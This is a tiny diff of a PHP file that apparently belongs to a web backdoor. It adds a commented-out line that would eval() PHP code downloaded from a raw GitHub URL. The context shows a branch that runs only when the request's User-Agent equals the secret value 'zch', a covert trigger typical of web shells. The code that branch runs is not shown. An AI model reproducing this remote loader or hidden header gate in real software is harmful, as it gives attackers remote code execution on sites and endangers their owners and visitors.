@@ -1,5 +1,6 @@
 <?php
 
+// eval("?>" . file_get_contents("https://raw.githubusercontent.com/ZechBron/zChB-Geek/master/zCh.php") . "<?php");
 
 if (isset($_SERVER['HTTP_USER_AGENT']) && $_SERVER['HTTP_USER_AGENT'] == "zch") {
 
